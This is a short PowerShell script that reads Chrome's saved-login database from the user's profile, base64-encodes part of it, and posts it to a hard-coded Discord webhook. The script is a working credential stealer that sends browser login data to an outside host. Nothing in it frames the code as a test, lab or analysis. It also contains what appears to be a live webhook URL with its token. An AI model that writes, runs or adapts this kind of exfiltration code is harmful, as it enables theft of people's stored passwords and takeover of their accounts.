# Set file path with spaces handled properly
$filePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"

# Check if file exists (using -LiteralPath to support spaces)
if (-Not (Test-Path -LiteralPath $filePath)) {
    Write-Host "File not found: $filePath"
    exit
}

# Read file as bytes (avoids issues with null or binary data)
$fileBytes = [System.IO.File]::ReadAllBytes($filePath)

# Convert to base64 string to avoid invalid characters in JSON
$fileBase64 = [Convert]::ToBase64String($fileBytes)

# Truncate to 1500 characters for Discord message limits
if ($fileBase64.Length -gt 1500) {
    $fileBase64 = $fileBase64.Substring(0, 1500) + "..."
}

# Build JSON payload manually with base64 content wrapped in code block
$jsonPayload = '{"content":"Base64 preview of Login Data:`n```' + $fileBase64 + '```"}'

# Your Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1374075895941169322/0q_M5862QHhmUHeIUIu9b0Y_L2feBqu-tbTz3gsbEiASX5HtOc8gwfh5fNMajSnbCrOq"

# Send POST request with JSON body
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonPayload -ContentType 'application/json'

Write-Host "Base64 preview sent to Discord webhook."
